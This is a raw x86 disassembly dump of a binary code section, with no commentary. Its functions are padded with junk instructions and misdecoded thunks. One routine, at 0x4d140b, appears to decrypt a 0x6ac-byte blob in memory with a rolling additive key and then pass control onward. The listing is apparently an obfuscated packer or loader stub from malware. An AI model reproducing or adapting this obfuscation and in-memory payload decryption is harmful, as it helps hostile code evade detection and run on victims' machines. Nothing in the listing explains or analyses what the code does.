  4d10a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10a9:	sub    esp,0x20
  4d10ac:	mov    edi,0x4d3024
  4d10b1:	xor    ecx,0x5b54
  4d10b7:	push   edi
  4d10b8:	push   edx
  4d10b9:	push   ecx
  4d10ba:	push   ecx
  4d10bb:	push   ebx
  4d10bc:	call   0x4d118c
  4d10c1:	add    esp,0x10
  4d10c4:	pop    edi
  4d10c5:	push   edi
  4d10c6:	mov    edx,0xfffffff4
  4d10cb:	push   edx
  4d10cc:	call   0x4d0f3c
  4d10d1:	add    esp,0x4
  4d10d4:	pop    edi
  4d10d5:	push   edi
  4d10d6:	call   0x4d1098
  4d10db:	add    esp,0x4
  4d10de:	pop    edi
  4d10df:	add    esp,0x20
  4d10e2:	pop    ebp
  4d10e3:	ret    
  4d10e4:	mov    edi,edi
  4d10e6:	push   ebp
  4d10e7:	mov    ebp,esp
  4d10e9:	sub    esp,0x38
  4d10ec:	mov    esi,0x4d306c
  4d10f1:	or     DWORD PTR [ebp-0x1c],ecx
  4d10f4:	mov    edi,0x0
  4d10f9:	push   edi
  4d10fa:	call   0x4d1024
  4d10ff:	add    esp,0x4
  4d1102:	push   esi
  4d1103:	push   DWORD PTR [esi+0x154]
  4d1109:	push   DWORD PTR [esi+0x15c]
  4d110f:	push   edi
  4d1110:	push   eax
  4d1111:	call   0x4d0cc0
  4d1116:	add    esp,0x10
  4d1119:	pop    esi
  4d111a:	mov    ebx,0x0
  4d111f:	push   ebx
  4d1120:	call   0x4d0dd8
  4d1125:	add    esp,0x4
  4d1128:	add    esp,0x38
  4d112b:	pop    ebp
  4d112c:	ret    
  4d112d:	add    BYTE PTR [eax],al
  4d112f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1135:	sub    esp,0x24
  4d1138:	lea    edx,[ebx+0x184]
  4d113e:	adc    ebx,0xffffffc7
  4d1141:	push   edx
  4d1142:	mov    edx,0x0
  4d1147:	push   edx
  4d1148:	call   0x4d0e08
  4d114d:	add    esp,0x4
  4d1150:	pop    edx
  4d1151:	push   edx
  4d1152:	push   esi
  4d1153:	push   DWORD PTR [edx+0x78]
  4d1156:	push   DWORD PTR [edx+0x60]
  4d1159:	push   DWORD PTR [edx+0xbc]
  4d115f:	call   0x4d0990
  4d1164:	add    esp,0x10
  4d1167:	pop    edx
  4d1168:	push   edx
  4d1169:	mov    eax,0x0
  4d116e:	push   eax
  4d116f:	call   0x4d1024
  4d1174:	add    esp,0x4
  4d1177:	pop    edx
  4d1178:	add    esp,0x24
  4d117b:	pop    ebp
  4d117c:	ret    
  4d117d:	add    BYTE PTR [eax],al
  4d117f:	add    BYTE PTR [edi-0x1],bl
  4d1182:	adc    eax,0x4d2058
  4d1187:	call   edi
  4d1189:	add    BYTE PTR [eax],al
  4d118b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1191:	sub    esp,0x44
  4d1194:	lea    eax,[edi+0x1c0]
  4d119a:	sub    DWORD PTR [eax-0x140],0xffffffc3
  4d11a1:	push   eax
  4d11a2:	push   esi
  4d11a3:	push   DWORD PTR [eax+0xa4]
  4d11a9:	push   edi
  4d11aa:	call   0x4d1308
  4d11af:	add    esp,0xc
  4d11b2:	pop    eax
  4d11b3:	push   eax
  4d11b4:	call   0x4d1098
  4d11b9:	add    esp,0x4
  4d11bc:	pop    eax
  4d11bd:	push   eax
  4d11be:	push   0x0
  4d11c0:	call   0x4d103c
  4d11c5:	add    esp,0x4
  4d11c8:	pop    eax
  4d11c9:	add    esp,0x44
  4d11cc:	pop    ebp
  4d11cd:	ret    
  4d11ce:	add    BYTE PTR [eax],al
  4d11d0:	mov    edi,edi
  4d11d2:	push   ebp
  4d11d3:	mov    ebp,esp
  4d11d5:	sub    esp,0x50
  4d11d8:	lea    ebx,ds:0x4d3040
  4d11de:	mov    ecx,0xfffffff8
  4d11e3:	push   ebx
  4d11e4:	push   DWORD PTR [ebx+0x74]
  4d11e7:	push   DWORD PTR [ebx+0x19c]
  4d11ed:	push   DWORD PTR [ebx+0x80]
  4d11f3:	push   esi
  4d11f4:	call   0x4d134c
  4d11f9:	add    esp,0x10
  4d11fc:	pop    ebx
  4d11fd:	mov    esi,0x0
  4d1202:	push   esi
  4d1203:	call   0x4d1584
  4d1208:	add    esp,0x4
  4d120b:	call   0x4d1098
  4d1210:	add    esp,0x4
  4d1213:	add    esp,0x50
  4d1216:	pop    ebp
  4d1217:	ret    
  4d1218:	pop    edi
  4d1219:	call   DWORD PTR ds:0x4d2078
  4d121f:	call   edi
  4d1221:	add    BYTE PTR [eax],al
  4d1223:	add    BYTE PTR [edi-0x1],bl
  4d1226:	adc    eax,0x4d2068
  4d122b:	call   edi
  4d122d:	add    BYTE PTR [eax],al
  4d122f:	add    BYTE PTR [edi-0x1],bl
  4d1232:	adc    eax,0x4d2098
  4d1237:	call   edi
  4d1239:	add    BYTE PTR [eax],al
  4d123b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1241:	sub    esp,0x48
  4d1244:	mov    esi,0x4d317c
  4d1249:	and    DWORD PTR [ebp-0x2c],edx
  4d124c:	push   0x0
  4d124e:	call   0x4d0de4
  4d1253:	add    esp,0x4
  4d1256:	push   esi
  4d1257:	push   DWORD PTR [esi+0x10c]
  4d125d:	push   ecx
  4d125e:	call   0x4d0ab4
  4d1263:	add    esp,0x8
  4d1266:	pop    esi
  4d1267:	push   0x0
  4d1269:	call   0x4d13dc
  4d126e:	add    esp,0x4
  4d1271:	add    esp,0x48
  4d1274:	pop    ebp
  4d1275:	ret    
  4d1276:	add    BYTE PTR [eax],al
  4d1278:	pop    edi
  4d1279:	call   DWORD PTR ds:0x4d203c
  4d127f:	call   edi
  4d1281:	add    BYTE PTR [eax],al
  4d1283:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1289:	sub    esp,0x2c
  4d128c:	lea    ecx,[edx-0x8]
  4d128f:	mov    esi,edi
  4d1291:	push   ecx
  4d1292:	push   ebx
  4d1293:	push   ebx
  4d1294:	push   ebx
  4d1295:	push   esi
  4d1296:	call   0x4d1048
  4d129b:	add    esp,0x10
  4d129e:	pop    ecx
  4d129f:	push   ecx
  4d12a0:	mov    edx,0x0
  4d12a5:	push   edx
  4d12a6:	call   0x4d1584
  4d12ab:	add    esp,0x4
  4d12ae:	pop    ecx
  4d12af:	push   ecx
  4d12b0:	push   0x0
  4d12b2:	call   0x4d1584
  4d12b7:	add    esp,0x4
  4d12ba:	pop    ecx
  4d12bb:	add    esp,0x2c
  4d12be:	pop    ebp
  4d12bf:	ret    
  4d12c0:	mov    edi,edi
  4d12c2:	push   ebp
  4d12c3:	mov    ebp,esp
  4d12c5:	sub    esp,0x2c
  4d12c8:	lea    edx,ds:0x4d309c
  4d12ce:	cmp    edx,0x1120
  4d12d4:	jb     0x4d12c3
  4d12d6:	push   edx
  4d12d7:	push   ecx
  4d12d8:	push   esi
  4d12d9:	call   0x4d0af4
  4d12de:	add    esp,0x8
  4d12e1:	pop    edx
  4d12e2:	push   edx
  4d12e3:	mov    esi,0x0
  4d12e8:	push   esi
  4d12e9:	call   0x4d0e8c
  4d12ee:	add    esp,0x4
  4d12f1:	pop    edx
  4d12f2:	push   edx
  4d12f3:	mov    edx,0x0
  4d12f8:	push   edx
  4d12f9:	call   0x4d0e08
  4d12fe:	add    esp,0x4
  4d1301:	pop    edx
  4d1302:	add    esp,0x2c
  4d1305:	pop    ebp
  4d1306:	ret    
  4d1307:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d130d:	sub    esp,0x44
  4d1310:	mov    ebx,0x4d3080
  4d1315:	adc    DWORD PTR [ebx+0xa4],eax
  4d131b:	call   0x4d1098
  4d1320:	add    esp,0x4
  4d1323:	push   ebx
  4d1324:	push   DWORD PTR [ebx+0xf0]
  4d132a:	push   eax
  4d132b:	push   ecx
  4d132c:	push   ecx
  4d132d:	call   0x4d08d0
  4d1332:	add    esp,0x10
  4d1335:	pop    ebx
  4d1336:	mov    ecx,0x0
  4d133b:	push   ecx
  4d133c:	call   0x4d0e8c
  4d1341:	add    esp,0x4
  4d1344:	add    esp,0x44
  4d1347:	pop    ebp
  4d1348:	ret    
  4d1349:	add    BYTE PTR [eax],al
  4d134b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1351:	sub    esp,0x1c
  4d1354:	lea    eax,[ebx+0x1c]
  4d1357:	and    edi,DWORD PTR [eax+0x90]
  4d135d:	push   eax
  4d135e:	mov    ebx,0x0
  4d1363:	push   ebx
  4d1364:	call   0x4d0de4
  4d1369:	add    esp,0x4
  4d136c:	pop    eax
  4d136d:	push   eax
  4d136e:	push   DWORD PTR [eax+0x10c]
  4d1374:	push   DWORD PTR [eax+0x68]
  4d1377:	push   DWORD PTR [eax+0x54]
  4d137a:	call   0x4d0e14
  4d137f:	add    esp,0xc
  4d1382:	pop    eax
  4d1383:	push   eax
  4d1384:	mov    ebx,0x0
  4d1389:	push   ebx
  4d138a:	call   0x4d0e80
  4d138f:	add    esp,0x4
  4d1392:	pop    eax
  4d1393:	add    esp,0x1c
  4d1396:	pop    ebp
  4d1397:	ret    
  4d1398:	mov    edi,edi
  4d139a:	push   ebp
  4d139b:	mov    ebp,esp
  4d139d:	sub    esp,0x28
  4d13a0:	lea    edx,ds:0x4d31fc
  4d13a6:	adc    ecx,DWORD PTR [ebp-0x20]
  4d13a9:	push   edx
  4d13aa:	call   0x4d0f48
  4d13af:	add    esp,0x4
  4d13b2:	pop    edx
  4d13b3:	push   edx
  4d13b4:	push   DWORD PTR [edx+0x10]
  4d13b7:	push   DWORD PTR [edx+0xc4]
  4d13bd:	push   esi
  4d13be:	push   esi
  4d13bf:	call   0x4d0838
  4d13c4:	add    esp,0x10
  4d13c7:	pop    edx
  4d13c8:	push   edx
  4d13c9:	push   0x0
  4d13cb:	call   0x4d0e8c
  4d13d0:	add    esp,0x4
  4d13d3:	pop    edx
  4d13d4:	add    esp,0x28
  4d13d7:	pop    ebp
  4d13d8:	ret    
  4d13d9:	add    BYTE PTR [eax],al
  4d13db:	add    BYTE PTR [edi-0x1],bl
  4d13de:	adc    eax,0x4d2010
  4d13e3:	call   edi
  4d13e5:	add    BYTE PTR [eax],al
  4d13e7:	add    BYTE PTR [edi-0x1],bl
  4d13ea:	adc    eax,0x4d2054
  4d13ef:	call   edi
  4d13f1:	add    BYTE PTR [eax],al
  4d13f3:	add    BYTE PTR [edi-0x1],bl
  4d13f6:	adc    eax,0x4d2070
  4d13fb:	call   edi
  4d13fd:	add    BYTE PTR [eax],al
  4d13ff:	add    BYTE PTR [edi-0x1],bl
  4d1402:	adc    eax,0x4d2008
  4d1407:	call   edi
  4d1409:	add    BYTE PTR [eax],al
  4d140b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1411:	sub    esp,0x1c
  4d1414:	and    esi,eax
  4d1416:	lea    edi,ds:0x4d3010
  4d141c:	push   edi
  4d141d:	push   0x6ac
  4d1422:	push   0x6ac
  4d1427:	mov    esi,0x40001
  4d142c:	push   esi
  4d142d:	mov    esi,0x862985c6
  4d1432:	push   DWORD PTR [esi+0x7a239a86]
  4d1438:	sub    DWORD PTR [esp],0x2
  4d143c:	mov    esi,0x4d202c
  4d1441:	pop    DWORD PTR [esi]
  4d1443:	call   0x4d0f9c
  4d1448:	add    esp,0x4
  4d144b:	xchg   DWORD PTR [esp],eax
  4d144e:	mov    edi,eax
  4d1450:	pop    DWORD PTR [edi+0x174]
  4d1456:	mov    ebx,DWORD PTR [edi+0x174]
  4d145c:	lea    ebx,[ebx]
  4d145e:	sub    esi,esi
  4d1460:	dec    esi
  4d1461:	and    esi,0x4d0014
  4d1467:	mov    edx,0x7ec7f445
  4d146c:	xor    ecx,ecx
  4d146e:	cmp    ecx,0x6ac
  4d1474:	je     0x4d1492
  4d1476:	sub    ecx,0xfffffffc
  4d1479:	xor    eax,eax
  4d147b:	push   DWORD PTR [esi+eax*1]
  4d147e:	add    DWORD PTR [esp],edx
  4d1481:	pop    DWORD PTR [ebx+eax*2]
  4d1484:	dec    DWORD PTR [ebx]
  4d1486:	xor    edx,edx
  4d1488:	add    edx,DWORD PTR [esi]
  4d148a:	add    esi,0x4
  4d148d:	add    ebx,0x4
  4d1490:	jmp    0x4d146e
  4d1492:	push   edi
  4d1493:	call   0x4d0f48
  4d1498:	add    esp,0x4
  4d149b:	pop    edi
  4d149c:	add    esp,0x1c
  4d149f:	pop    ebp
  4d14a0:	ret    
  4d14a1:	add    BYTE PTR [eax],al
  4d14a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a9:	sub    esp,0x48
  4d14ac:	mov    ebx,0x4d3058
  4d14b1:	cmp    ebx,0x3f8
  4d14b7:	jbe    0x4d14a7
  4d14b9:	push   ebx
  4d14ba:	push   DWORD PTR [ebx+0xd8]
  4d14c0:	push   DWORD PTR [ebx+0x19c]
  4d14c6:	push   edi
  4d14c7:	push   DWORD PTR [ebx+0x74]
  4d14ca:	call   0x4d10e4
  4d14cf:	add    esp,0x10
  4d14d2:	pop    ebx
  4d14d3:	mov    ecx,0x0
  4d14d8:	push   ecx
  4d14d9:	call   0x4d0dfc
  4d14de:	add    esp,0x4
  4d14e1:	push   0x0
  4d14e3:	call   0x4d0dfc
  4d14e8:	add    esp,0x4
  4d14eb:	add    esp,0x48
  4d14ee:	pop    ebp
  4d14ef:	ret    
  4d14f0:	mov    edi,edi
  4d14f2:	push   ebp
  4d14f3:	mov    ebp,esp
  4d14f5:	sub    esp,0x44
  4d14f8:	lea    eax,ds:0x4d317c
  4d14fe:	or     edi,DWORD PTR [eax-0x3c]
  4d1501:	push   eax
  4d1502:	push   edi
  4d1503:	push   edi
  4d1504:	call   0x4d0a20
  4d1509:	add    esp,0x8
  4d150c:	pop    eax
  4d150d:	push   eax
  4d150e:	mov    edi,0x0
  4d1513:	push   edi
  4d1514:	call   0x4d0e08
  4d1519:	add    esp,0x4
  4d151c:	pop    eax
  4d151d:	push   eax
  4d151e:	call   0x4d0f48
  4d1523:	add    esp,0x4
  4d1526:	pop    eax
  4d1527:	add    esp,0x44
  4d152a:	pop    ebp
  4d152b:	ret    
  4d152c:	mov    edi,edi
  4d152e:	push   ebp
  4d152f:	mov    ebp,esp
  4d1531:	sub    esp,0x2c
  4d1534:	mov    edi,0x4d3048
  4d1539:	mov    DWORD PTR [edi+0x154],edi
  4d153f:	push   edi
  4d1540:	push   DWORD PTR [edi+0x1bc]
  4d1546:	push   DWORD PTR [edi+0xec]
  4d154c:	push   DWORD PTR [edi+0x18c]
  4d1552:	push   esi
  4d1553:	call   0x4d0ff0
  4d1558:	add    esp,0x10
  4d155b:	pop    edi
  4d155c:	push   edi
  4d155d:	lea    eax,[edi-0x48]
  4d1560:	push   eax
  4d1561:	call   0x4d1278
  4d1566:	add    esp,0x4
  4d1569:	test   eax,eax
  4d156b:	jne    0x4d155d
  4d156d:	pop    edi
  4d156e:	push   edi
  4d156f:	mov    eax,0x0
  4d1574:	push   eax
  4d1575:	call   0x4d0e8c
  4d157a:	add    esp,0x4
  4d157d:	pop    edi
  4d157e:	add    esp,0x2c
  4d1581:	pop    ebp
  4d1582:	ret    
  4d1583:	add    BYTE PTR [edi-0x1],bl
  4d1586:	adc    eax,0x4d2014
  4d158b:	call   edi
  4d158d:	add    BYTE PTR [eax],al
  4d158f:	add    BYTE PTR [edi-0x1],bl
  4d1592:	adc    eax,0x4d2074
  4d1597:	call   edi
  4d1599:	add    BYTE PTR [eax],al
  4d159b:	add    BYTE PTR [edi-0x1],bl
  4d159e:	adc    eax,0x4d204c
  4d15a3:	call   edi
  4d15a5:	add    BYTE PTR [eax],al
  4d15a7:	add    BYTE PTR [edi-0x1],bl
  4d15aa:	adc    eax,0x4d209c
  4d15af:	call   edi
  4d15b1:	add    BYTE PTR [eax],al
	...
